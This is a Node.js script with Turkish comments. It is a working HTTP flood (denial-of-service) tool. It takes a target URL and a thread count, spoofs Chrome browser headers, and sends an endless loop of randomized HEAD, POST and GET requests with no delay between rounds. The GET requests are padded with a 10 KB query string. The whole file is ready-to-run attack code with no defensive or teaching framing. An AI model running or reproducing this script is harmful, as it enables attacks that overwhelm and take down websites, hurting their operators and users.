const axios = require('axios');
const process = require('process');

// Başlıkları ayarla
const headers = {
  'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
  'cache-control': "max-age=0",
  'referer': 'http://abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijk.com/',
  'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
  'sec-ch-ua-mobile': "?0",
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': "document",
  'sec-fetch-mode': "navigate",
  'sec-fetch-site': "none",
  'sec-fetch-user': "?1",
  'upgrade-insecure-requests': "1",
  'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
};

// İstek tiplerini diziye koyalım
const requestTypes = ['HEAD', 'POST', 'GET'];

// Rastgele bir gecikme eklemek için bir fonksiyon
const getRandomDelay = () => Math.floor(Math.random() * 10);

// İstek göndermek için işlev
const sendRequest = async (url, index) => {
  const randomDelay = getRandomDelay(); 
  await new Promise(resolve => setTimeout(resolve, randomDelay));

  try {
    // Rastgele bir istek tipi seç
    const randomIndex = Math.floor(Math.random() * requestTypes.length);
    const requestType = requestTypes[randomIndex];
    const randomText = Math.random().toString(36).substring(2, 12); 
    const randomNumber = Math.floor(Math.random() * 101); 
    const randomDate = new Date(Date.now() - Math.floor(Math.random() * 31556952000));
    const postData = {
      text: randomText,
      number: randomNumber,
      date: randomDate
    };
    console.log(`Seçilen istek tipi: ${requestType}`); // Hata ayıklama

    // Seçilen istek tipine göre isteği gönder
    switch (requestType) {
      case 'HEAD':
        await axios.head(url, { headers });
        break;
      case 'POST':
        await axios.post(url, postData, { headers });
        break;
      case 'GET':
        const targetUrl = `${url}?A=${'A'.repeat(1024 * 10)}`;
        await axios.get(targetUrl, { headers });
        break;
      default:
        console.error(`Bilinmeyen istek tipi: ${requestType}`);
    }

    console.log(`İstek ${index}-${requestType} gönderildi.`);
  } catch (error) {
    console.error(`İstek ${index} gönderilirken hata oluştu:`, error.message);
  }
};

// Terminalden URL ve thread sayısını al
const args = process.argv.slice(2);
if (args.length < 2) {
  console.error('Lütfen URL ve eş zamanlı iş parçacığı sayısını belirtin.');
  process.exit(1);
}

const url = args[0];
const numberOfThreads = parseInt(args[1], 10);

if (isNaN(numberOfThreads) || numberOfThreads <= 0) {
  console.error('Eş zamanlı iş parçacığı sayısı geçerli bir sayı olmalıdır.');
  process.exit(1);
}

console.log(`URL: ${url}`);
console.log(`Eş zamanlı iş parçacığı sayısı: ${numberOfThreads}`);

// Sonsuza kadar istek gönder
let requestCounter = 1;
setInterval(() => {
  for (let i = 0; i < numberOfThreads; i++) {
    sendRequest(url, requestCounter++);
  }
}, 0); // Her döngü arasında gecikme olmadan çalıştır
